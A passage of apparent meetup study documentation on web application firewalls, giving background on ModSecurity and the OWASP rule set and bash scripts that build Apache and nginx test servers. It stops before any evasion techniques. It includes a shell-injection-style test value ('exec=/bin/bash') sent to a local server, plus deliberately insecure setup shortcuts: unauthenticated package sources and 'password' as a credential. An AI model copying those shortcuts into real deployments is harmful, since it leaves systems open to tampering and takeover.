

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>8.21. WAF Evasion &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="8. Pentest Study" href="../pentest_study.html"/>
        <link rel="next" title="8.22. WiFi Tutorial" href="wifi.html"/>
        <link rel="prev" title="8.20. Vulnerabilites" href="vulnerabilities.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="2factor.html">8.1. 2 Factor Authentication</a></li>
<li class="toctree-l2"><a class="reference internal" href="dnssec.html">8.2. DNSSEC, DANE, and DNS encryption</a></li>
<li class="toctree-l2"><a class="reference internal" href="email_security.html">8.3. Email Security</a></li>
<li class="toctree-l2"><a class="reference internal" href="exfiltration.html">8.4. Exfiltration</a></li>
<li class="toctree-l2"><a class="reference internal" href="exiftool.html">8.5. <strong class="program">exiftool</strong></a></li>
<li class="toctree-l2"><a class="reference internal" href="fw.html">8.6. Firewalls</a></li>
<li class="toctree-l2"><a class="reference internal" href="ipv6.html">8.7. IPv6</a></li>
<li class="toctree-l2"><a class="reference internal" href="loadlibrary.html">8.8. loadlibrary</a></li>
<li class="toctree-l2"><a class="reference internal" href="linux_exploitation_tricks.html">8.9. Linux Exploitation Tricks</a></li>
<li class="toctree-l2"><a class="reference internal" href="linux_networking.html">8.10. Linux networking</a></li>
<li class="toctree-l2"><a class="reference internal" href="llmnr.html">8.11. Windows broadcast name resolution</a></li>
<li class="toctree-l2"><a class="reference internal" href="nftables.html">8.12. nftables</a></li>
<li class="toctree-l2"><a class="reference internal" href="not_getting_hacked.html">8.13. Not getting hacked</a></li>
<li class="toctree-l2"><a class="reference internal" href="ntlm.html">8.14. NTLM</a></li>
<li class="toctree-l2"><a class="reference internal" href="passwords.html">8.15. Password Cracking Resources</a></li>
<li class="toctree-l2"><a class="reference internal" href="php.html">8.16. PHP &amp; MySQL Shortcomings</a></li>
<li class="toctree-l2"><a class="reference internal" href="pkcs.html">8.17. PKCS standards</a></li>
<li class="toctree-l2"><a class="reference internal" href="static_websites.html">8.18. Static websites</a></li>
<li class="toctree-l2"><a class="reference internal" href="virtualization_networking.html">8.19. Virtualization &amp; networking</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnerabilities.html">8.20. Vulnerabilites</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">8.21. WAF Evasion</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#what-s-a-waf">8.21.1. Whatâ€™s a WAF?</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#wafs">8.21.1.1. WAFs</a></li>
<li class="toctree-l4"><a class="reference internal" href="#modsecurity-waf-for-apache-nginx-and-iis">8.21.1.2. ModSecurity WAF for Apache, Nginx, and IIS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#owasp-core-rule-set-for-wafs">8.21.1.3. OWASP Core Rule Set for WAFs</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#waf-options">8.21.2. WAF options</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#waf-via-apache2-simple-or-nginx-hard">8.21.2.1. WAF via Apache2 (simple) or nginx (hard)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#provisioning-a-vm">8.21.2.2. Provisioning a VM</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#building-the-waf-using-apache2-lamp">8.21.3. Building the WAF using Apache2 (LAMP)</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#install-the-lamp-stack">8.21.3.1. Install the LAMP stack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#configure-modsecurity-on-apache">8.21.3.2. Configure ModSecurity on Apache</a></li>
<li class="toctree-l4"><a class="reference internal" href="#test-modsecurity">8.21.3.3. Test ModSecurity</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#building-the-waf-using-nginx-lemp">8.21.4. Building the WAF using nginx (LEMP)</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#install-modsecurity-with-nginx">8.21.4.1. Install ModSecurity with NGINX</a></li>
<li class="toctree-l4"><a class="reference internal" href="#add-in-the-owasp-crs">8.21.4.2. Add in the OWASP CRS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#install-and-configure-mysql">8.21.4.3. Install and configure MySQL</a></li>
<li class="toctree-l4"><a class="reference internal" href="#install-and-configure-php">8.21.4.4. Install and configure PHP</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id23">8.21.5. WAF evasion</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#waf-evasion-techniques">8.21.5.1. WAF Evasion Techniques</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="wifi.html">8.22. WiFi Tutorial</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_study.html">8. Pentest Study</a> &raquo;</li>
        
      <li>8.21. WAF Evasion</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/study/waf.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="waf-evasion">
<span id="id21"></span><h1>8.21. WAF Evasion<a class="headerlink" href="#waf-evasion" title="Permalink to this headline">Â¶</a></h1>
<div class="section" id="what-s-a-waf">
<h2>8.21.1. Whatâ€™s a WAF?<a class="headerlink" href="#what-s-a-waf" title="Permalink to this headline">Â¶</a></h2>
<div class="section" id="wafs">
<h3>8.21.1.1. WAFs<a class="headerlink" href="#wafs" title="Permalink to this headline">Â¶</a></h3>
<p>From Wikipediaâ€™s <a class="reference external" href="https://en.wikipedia.org/wiki/Web_application_firewall">Web application firewall</a>:</p>
<blockquote>
<div><p>A web application firewall (or WAF) filters, monitors, and blocks HTTP traffic to and from a web application. A WAF is differentiated from a regular firewall in that a WAF is able to filter the content of specific web applications while regular firewalls serve as a safety gate between servers. By inspecting HTTP traffic, it can prevent attacks stemming from web application security flaws, such as SQL injection, cross-site scripting (XSS), file inclusion, and security misconfigurations.</p>
<p>In 2002, the open source project ModSecurity[7] was formed in order to make WAF technology more accessible and solve the obstacles within the industry like business cases, cost barriers, and proprietary rule-sets. ModSecurity finalized a core rule set for protecting Web Applications, based on the OASIS Web Application Security Technical Committeeâ€™s (WAS TC) vulnerability work. In 2003, their work was expanded and standardized through the Open Web Application Security Projectâ€™s (OWASP) Top 10 List, an annual ranking for web security vulnerabilities. This list would become the industry benchmark for many compliance themes.</p>
</div></blockquote>
</div>
<div class="section" id="modsecurity-waf-for-apache-nginx-and-iis">
<h3>8.21.1.2. ModSecurity WAF for Apache, Nginx, and IIS<a class="headerlink" href="#modsecurity-waf-for-apache-nginx-and-iis" title="Permalink to this headline">Â¶</a></h3>
<p>From Wikipediaâ€™s <a class="reference external" href="https://en.wikipedia.org/wiki/ModSecurity">ModSecurity</a>:</p>
<blockquote>
<div><p>ModSecurity, sometimes called Modsec, is a popular Open-source Web application firewall (WAF). Originally designed as a module for the Apache HTTP Server, it has evolved to provide an array of Hypertext Transfer Protocol request and response filtering capabilities along with other security features across a number of different platforms including Apache HTTP Server, Microsoft IIS and NGINX. It is a free software released under the Apache license 2.0.</p>
<p>Although not its only configuration, ModSecurity is most commonly deployed to provide protections against generic classes of vulnerabilities using the OWASP ModSecurity Core Rule Set (CRS). This is an Open-source set of rules written in ModSecurityâ€™s SecRules language. The project is part of OWASP, the Open Web Application Security Project. Several other rule sets are also available for ModSecurity.</p>
</div></blockquote>
</div>
<div class="section" id="owasp-core-rule-set-for-wafs">
<h3>8.21.1.3. OWASP Core Rule Set for WAFs<a class="headerlink" href="#owasp-core-rule-set-for-wafs" title="Permalink to this headline">Â¶</a></h3>
<p>From <a class="reference external" href="https://owasp.blogspot.ch/2017/12/core-rule-set-evolution-of-an-owasp-project.html">Core Rule Set: The evolution of an OWASP Project</a>:</p>
<blockquote>
<div>Let me put one thing straight: there are two things when we talk about ModSecurity. There is the naked ModSecurity engine running inside NGINX or Apache and there is the rule set that instructs the engine what to do. Many different rule sets exist. But the rule set with the largest user base (and longest name) is the <a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_ModSecurity_Core_Rule_Set_Project">OWASP ModSecurity Core Rule Set</a> or CRS for short.</div></blockquote>
<p>For documentation see <a class="reference external" href="https://www.modsecurity.org/CRS/Documentation/">OWASP Core Rule Set: Documentation</a>, but it currently discussed ModSecurity 2.x and not the 3.x used here.</p>
<p>The main articles weâ€™ll discuss are <a class="reference external" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a> and <a class="reference external" href="https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0">Web Application Firewall (WAF) Evasion Techniques #2</a>.</p>
</div>
</div>
<div class="section" id="waf-options">
<h2>8.21.2. WAF options<a class="headerlink" href="#waf-options" title="Permalink to this headline">Â¶</a></h2>
<div class="section" id="waf-via-apache2-simple-or-nginx-hard">
<h3>8.21.2.1. WAF via Apache2 (simple) or nginx (hard)<a class="headerlink" href="#waf-via-apache2-simple-or-nginx-hard" title="Permalink to this headline">Â¶</a></h3>
<p>Simply put, Apache2 is easy because distributions like Debian provide a pre-compiled <strong class="program">libapache2-modsecurity</strong> to match the distributionâ€™s <strong class="program">apache2</strong>. But from <a class="reference external" href="https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/">Compiling and Installing ModSecurity for Open Source NGINX</a> dated August 4, 2017:</p>
<blockquote>
<div>The latest version, ModSecurity 3.0, breaks new ground with a modular architecture that runs natively in NGINX. Previous versions worked only with the Apache HTTP Server. We recently released ModSecurity 3.0 as a dynamic module for NGINX Plus, but as of this writing there is no prebuilt ModSecurity dynamic module for open source NGINX. In this blog we show how to create a ModSecurity 3.0 dynamic module for use with open source NGINX.</div></blockquote>
<p>So with <strong class="program">nginx</strong> itâ€™s currently not as simple as installing the application - a version compatible with the distribution-provided <strong class="program">apache2</strong> must be compiled.</p>
</div>
<div class="section" id="provisioning-a-vm">
<h3>8.21.2.2. Provisioning a VM<a class="headerlink" href="#provisioning-a-vm" title="Permalink to this headline">Â¶</a></h3>
<p>We presume you will provision a Debian 9 VM on some cloud provider. We choose Debian 9 because Kali is based on Debian and Debian 9 is the newest version available on most cloud providers. Generally, Ubuntu can be used instead, and once Ubuntu 18.04 LTS is released it will become a better choice. Given that we have Linode credits to burn, we use the Linode provider, but the procedures should apply on other providers.</p>
<p>Note that these VMs are not hardened for security - more a quick and dirty to run the ModSecurity WAF.</p>
</div>
</div>
<div class="section" id="building-the-waf-using-apache2-lamp">
<h2>8.21.3. Building the WAF using Apache2 (LAMP)<a class="headerlink" href="#building-the-waf-using-apache2-lamp" title="Permalink to this headline">Â¶</a></h2>
<div class="section" id="install-the-lamp-stack">
<h3>8.21.3.1. Install the LAMP stack<a class="headerlink" href="#install-the-lamp-stack" title="Permalink to this headline">Â¶</a></h3>
<p>We install the LAMP stack (vs. something like the MEAN stack) simply because itâ€™s probably more familiar to readers. Of the many <a class="reference external" href="https://linode.com/docs/web-servers/lamp/">Linode LAMP Guides</a> we will follow <a class="reference external" href="https://linode.com/docs/web-servers/lamp/install-lamp-stack-on-ubuntu-16-04/">How to Install a LAMP Stack on Ubuntu 16.04</a> on Debian 9:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Become www.example.com locally</span>
</span><span class="nv">IP</span><span class="o">=</span><span class="k">$(</span>ip addr show eth0 <span class="p">|</span> grep <span class="s2">&quot;inet\b&quot;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> cut -d/ -f1<span class="k">)</span>
<span class="nb">echo</span> <span class="s2">&quot;waf-apache2&quot;</span> &gt; /etc/hostname
hostname -F /etc/hostname
sed -i <span class="s1">&#39;1 i\&#39;</span><span class="nv">$IP</span><span class="s1">&#39;  www.example.com waf-apache2.example.com waf-apache2.localdomain waf-apache2&#39;</span> /etc/hosts

<span class="c1"># Install apache2</span>
apt install apache2 -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
a2dismod mpm_event
a2enmod mpm_prefork
systemctl restart apache2

<span class="c1"># Configure apache virtual hosts</span>
cat &gt; /etc/apache2/sites-available/example.com.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;Directory /var/www/html/example.com/public_html&gt;</span>
<span class="s">        Require all granted</span>
<span class="s">&lt;/Directory&gt;</span>
<span class="s">&lt;VirtualHost *:80&gt;</span>
<span class="s">        ServerName example.com</span>
<span class="s">        ServerAlias www.example.com</span>
<span class="s">        ServerAdmin webmaster@localhost</span>
<span class="s">        DocumentRoot /var/www/html/example.com/public_html</span>

<span class="s">        ErrorLog /var/www/html/example.com/logs/error.log</span>
<span class="s">        CustomLog /var/www/html/example.com/logs/access.log combined</span>
<span class="s">&lt;/VirtualHost&gt;</span>
<span class="s">EOF</span>

mkdir -p /var/www/html/example.com/<span class="o">{</span>public_html,logs<span class="o">}</span>
a2ensite example.com.conf
a2dissite <span class="m">000</span>-default.conf
systemctl reload apache2

<span class="c1"># Install mysql database</span>
<span class="nv">PW</span><span class="o">=</span>password
apt install mysql-server -y &lt; /dev/null
<span class="c1"># change root password and answer Y</span>
<span class="o">{</span> <span class="nb">echo</span> -e <span class="s2">&quot;\n&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;Y&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PW</span><span class="s2">&quot;</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">&quot;</span><span class="nv">$PW</span><span class="s2">&quot;</span><span class="p">;</span> yes Y<span class="p">;</span> <span class="o">}</span> <span class="p">|</span> <span class="se">\</span>
    mysql_secure_installation
<span class="c1"># Create test database and user</span>
mysql -u root -p<span class="nv">$PW</span>
CREATE DATABASE webdata<span class="p">;</span>
GRANT ALL ON webdata.* TO <span class="s1">&#39;webuser&#39;</span> IDENTIFIED BY <span class="s1">&#39;password&#39;</span><span class="p">;</span>
quit

<span class="c1"># Install php7</span>
apt install php7.0 libapache2-mod-php7.0 php7.0-mysql -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
apt install php7.0-curl php7.0-json php7.0-cgi -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
<span class="c1"># error_log = /var/log/php/error.log</span>
sed -i <span class="s1">&#39;/;error_log = syslog/a\error_log = /var/log/php/error.log&#39;</span> /etc/php/7.0/apache2/php.ini
<span class="c1"># Create log directory</span>
mkdir /var/log/php
chown www-data /var/log/php
systemctl restart apache2

<span class="c1"># Add php database config file</span>
<span class="nv">PHPDIR</span><span class="o">=</span>/var/www/html/example.com/public_html
cat &gt; <span class="nv">$PHPDIR</span>/config.php <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;?php</span>
<span class="s"> define(&#39;DB_SERVER&#39;, &#39;localhost&#39;);</span>
<span class="s"> define(&#39;DB_USERNAME&#39;, &#39;webuser&#39;);</span>
<span class="s"> define(&#39;DB_PASSWORD&#39;, &#39;password&#39;);</span>
<span class="s"> define(&#39;DB_NAME&#39;, &#39;webdata&#39;);</span>
<span class="s"> ?&gt;</span>
<span class="s">EOF</span>

<span class="c1"># Add php page testing database password</span>
cat &gt; <span class="nv">$PHPDIR</span>/phptest.php <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;html&gt;</span>
<span class="s">&lt;head&gt;</span>
<span class="s">    &lt;title&gt;PHP Test&lt;/title&gt;</span>
<span class="s">&lt;/head&gt;</span>
<span class="s">    &lt;body&gt;</span>
<span class="s">    &lt;?php</span>
<span class="s">    include_once &#39;config.php&#39;;</span>

<span class="s">    echo &#39;&lt;p&gt;Hello World&lt;/p&gt;&#39;;</span>

<span class="s">    // In the variables section below, replace user and password with your own MySQL credentials as created on your server</span>
<span class="s">    $servername = DB_SERVER;</span>
<span class="s">    $username = DB_USERNAME;</span>
<span class="s">    $password = DB_PASSWORD;</span>

<span class="s">    // Create MySQL connection</span>
<span class="s">    $conn = mysqli_connect($servername, $username, $password);</span>

<span class="s">    // Check connection - if it fails, output will include the error message</span>
<span class="s">    if (!$conn) {</span>
<span class="s">        die(&#39;&lt;p&gt;Connection failed: &lt;p&gt;&#39; . mysqli_connect_error());</span>
<span class="s">    }</span>
<span class="s">    echo &#39;&lt;p&gt;Connected successfully&lt;/p&gt;&#39;;</span>
<span class="s">    ?&gt;</span>
<span class="s">&lt;/body&gt;</span>
<span class="s">&lt;/html&gt;</span>
<span class="s">EOF</span>

<span class="c1"># Make sure can connect to database</span>
curl localhost/phptest.php
</pre></div>
</div>
</div>
<div class="section" id="configure-modsecurity-on-apache">
<h3>8.21.3.2. Configure ModSecurity on Apache<a class="headerlink" href="#configure-modsecurity-on-apache" title="Permalink to this headline">Â¶</a></h3>
<p>Follow <a class="reference external" href="https://linode.com/docs/web-servers/apache-tips-and-tricks/configure-modsecurity-on-apache/">How to Configure ModSecurity on Apache</a>:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Working directory</span>
</span>mkdir -p ~/waf
<span class="nb">cd</span> ~/waf

<span class="c1"># Install ModSecurity</span>
apt install libapache2-modsecurity -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null
systemctl restart apache2

<span class="c1"># OWASP ModSecurity Core Rule Set</span>
<span class="c1"># Default package uses ModSecurity 2 and we want 3</span>
mv /etc/modsecurity/modsecurity.conf-recommended  modsecurity.conf
apt install git -y &lt; /dev/null
git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git
<span class="nb">cd</span> owasp-modsecurity-crs
mv crs-setup.conf.example /etc/modsecurity/crs-setup.conf
mv rules/ /etc/modsecurity/
<span class="c1"># Point to OWASP rules by modify /etc/apache2/mods-available/security2.conf</span>
mv /etc/apache2/mods-available/security2.conf<span class="o">{</span>,.bak<span class="o">}</span>
cat &gt; /etc/apache2/mods-available/security2.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;IfModule security2_module&gt;</span>
<span class="s">        # Default Debian dir for modsecurity&#39;s persistent data</span>
<span class="s">        SecDataDir /var/cache/modsecurity</span>
<span class="s">        # Include all the *.conf files in /etc/modsecurity.</span>
<span class="s">        # Keeping your local configuration in that directory</span>
<span class="s">        # will allow for an easy upgrade of THIS file and</span>
<span class="s">        # make your life easier</span>
<span class="s">        IncludeOptional /etc/modsecurity/*.conf</span>
<span class="s">        Include /etc/modsecurity/rules/*.conf</span>
<span class="s">&lt;/IfModule&gt;</span>
<span class="s">EOF</span>

systemctl restart apache2
</pre></div>
</div>
</div>
<div class="section" id="test-modsecurity">
<h3>8.21.3.3. Test ModSecurity<a class="headerlink" href="#test-modsecurity" title="Permalink to this headline">Â¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Replace example.com.conf with test ModSecurity SecRule</span>
</span>cat &gt; /etc/apache2/sites-available/example.com.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">&lt;Directory /var/www/html/example.com/public_html&gt;</span>
<span class="s">        Require all granted</span>
<span class="s">&lt;/Directory&gt;</span>
<span class="s">&lt;VirtualHost *:80&gt;</span>
<span class="s">        ServerName example.com</span>
<span class="s">        ServerAlias www.example.com</span>
<span class="s">        ServerAdmin webmaster@localhost</span>
<span class="s">        DocumentRoot /var/www/html/example.com/public_html</span>

<span class="s">        ErrorLog /var/www/html/example.com/logs/error.log</span>
<span class="s">        CustomLog /var/www/html/example.com/logs/access.log combined</span>

<span class="s">        SecRuleEngine On</span>
<span class="s">        SecRule ARGS:testparam &quot;@contains test&quot; &quot;id:1234,deny,status:403,msg:&#39;Our test rule has triggered&#39;&quot;</span>
<span class="s">&lt;/VirtualHost&gt;</span>
<span class="s">EOF</span>

<span class="c1"># testparam triggers WAF, testpara doesn&#39;t, and /bin/bash does</span>
curl localhost/phptest.php?testparam<span class="o">=</span><span class="nb">test</span>
curl localhost/phptest.php?testpara<span class="o">=</span><span class="nb">test</span>
curl localhost/phptest.php?exec<span class="o">=</span>/bin/bash
</pre></div>
</div>
</div>
</div>
<div class="section" id="building-the-waf-using-nginx-lemp">
<h2>8.21.4. Building the WAF using nginx (LEMP)<a class="headerlink" href="#building-the-waf-using-nginx-lemp" title="Permalink to this headline">Â¶</a></h2>
<p>Look at <a class="reference external" href="https://github.com/h5bp/server-configs-nginx">Nginx Server Configs</a> to harden nginx below.</p>
<div class="section" id="install-modsecurity-with-nginx">
<h3>8.21.4.1. Install ModSecurity with NGINX<a class="headerlink" href="#install-modsecurity-with-nginx" title="Permalink to this headline">Â¶</a></h3>
<p><a class="reference external" href="https://www.nginx.com/blog/compiling-and-installing-modsecurity-for-open-source-nginx/">Compiling and Installing ModSecurity for Open Source NGINX</a></p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="c1"># Become www2.example.com locally</span>
</span><span class="nv">IP</span><span class="o">=</span><span class="k">$(</span>ip addr show eth0 <span class="p">|</span> grep <span class="s2">&quot;inet\b&quot;</span> <span class="p">|</span> awk <span class="s1">&#39;{print $2}&#39;</span> <span class="p">|</span> cut -d/ -f1<span class="k">)</span>
<span class="nb">echo</span> <span class="s2">&quot;waf-nginx&quot;</span> &gt; /etc/hostname
hostname -F /etc/hostname
sed -i <span class="s1">&#39;1 i\&#39;</span><span class="nv">$IP</span><span class="s1">&#39;  www2.example.com waf-nginx.example.com waf-nginx.localdomain waf-nginx&#39;</span> /etc/hosts

<span class="c1"># Install ngnix from nginx.org and not Debian</span>
cat &gt; /etc/apt/sources.list.d/nginx.list <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s">deb [allow-insecure=yes allow-downgrade-to-insecure=yes] http://nginx.org/packages/mainline/debian/ stretch nginx</span>
<span class="s">deb-src [allow-insecure=yes allow-downgrade-to-insecure=yes] http://nginx.org/packages/mainline/debian/ stretch nginx</span>
<span class="s">EOF</span>

apt update -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> &lt; /dev/null
apt install nginx --allow-unauthenticated -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y &lt; /dev/null

<span class="c1"># Install prereq packages needed for building software</span>
apt install -o Acquire::ForceIPv4<span class="o">=</span><span class="nb">true</span> -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-dev &lt; /dev/null

<span class="c1"># Download and compile ModSecurity</span>
mkdir -p ~/waf
<span class="nb">cd</span> ~/waf
git clone --depth <span class="m">1</span> -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurity
<span class="nb">cd</span> ModSecurity
git submodule init
git submodule update
./build.sh
./configure
make
make install
<span class="nb">cd</span> ..

<span class="c1"># Download NGINX Connector for ModSecurity and compile as dynamic module</span>
git clone --depth <span class="m">1</span> https://github.com/SpiderLabs/ModSecurity-nginx.git
<span class="nv">NV</span><span class="o">=</span><span class="k">$(</span>nginx -v <span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> sed <span class="s1">&#39;s/^.*\///&#39;</span><span class="k">)</span>
wget -4 http://nginx.org/download/nginx-<span class="si">${</span><span class="nv">NV</span><span class="si">}</span>.tar.gz
tar zxvf nginx-<span class="si">${</span><span class="nv">NV</span><span class="si">}</span>.tar.gz
<span class="nb">cd</span> nginx-<span class="si">${</span><span class="nv">NV</span><span class="si">}</span>
./configure --with-compat --add-dynamic-module<span class="o">=</span>../ModSecurity-nginx
make modules
cp objs/ngx_http_modsecurity_module.so /etc/nginx/modules

<span class="c1"># Load the NGINX ModSecurity Connector Dynamic Module</span>

<span class="c1"># Add to top-level context in /etc/nginx/nginx.conf</span>
<span class="c1"># load_module modules/ngx_http_modsecurity_module.so;</span>
sed -i <span class="s1">&#39;2 i\load_module modules/ngx_http_modsecurity_module.so;&#39;</span> /etc/nginx/nginx.conf

<span class="c1"># Configure, enable, and test ModSecurity</span>
mkdir /etc/nginx/modsec
wget -4 -P /etc/nginx/modsec/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/master/modsecurity.conf-recommended
mv /etc/nginx/modsec/modsecurity.conf-recommended /etc/nginx/modsec/modsecurity.conf
sed -i <span class="s1">&#39;s/SecRuleEngine DetectionOnly/SecRuleEngine On/&#39;</span> /etc/nginx/modsec/modsecurity.conf
<span class="c1"># SecRequestBodyInMemoryLimit is a problem, so comment it out</span>
sed -i <span class="s1">&#39;s/^SecRequestBodyInMemoryLimit/#SecRequestBodyInMemoryLimit/&#39;</span> /etc/nginx/modsec/modsecurity.conf

<span class="c1"># Create /etc/nginx/modsec/main.conf</span>
cat &gt; /etc/nginx/modsec/main.conf <span class="s">&lt;&lt;&#39;EOF&#39;</span>
<span class="s"># From https://github.com/SpiderLabs/ModSecurity/blob/master/\</span>
<span class="s"># modsecurity.conf-recommended</span>
<span class="s">#</span>
<span class="s"># Edit to set SecRuleEngine On</span>
<span class="s">Include &quot;/etc/nginx/modsec/modsecurity.conf&quot;</span>
<span class="s"># Basic test rule</span>
<span class="s">SecRule ARGS:testparam &quot;@contains test&quot; &quot;id:1234,deny,status:403&quot;</span>
<span class="s">EOF</span>

<span class="c1"># Add to end of /etc/nginx/conf.d/default.conf:</span>
sed -i <span class="s1">&#39;/^}/i\</span>
<span class="s1">    # modsecurity\</span>
<span class="s1">    modsecurity on;\</span>
<span class="s1">    modsecurity_rules_file /etc/nginx/modsec/main.conf;&#39;</span> /etc/nginx/conf.d/default.conf

systemctl restart nginx

<span class="c1"># testparam triggers WAF, testpara doesn&#39;t, and /bin/bash does</span>
curl localhost/?testparam<span class="o">=</span><span class="nb">test</span>
curl localhost/?testpara<span class="o">=</span><span class="nb">test</span>
curl localhost/?exec<span class="o">=</span>/bin/bash
</pre></div>
</div>
</div>
<div class="section" id="add-in-the-owasp-crs">
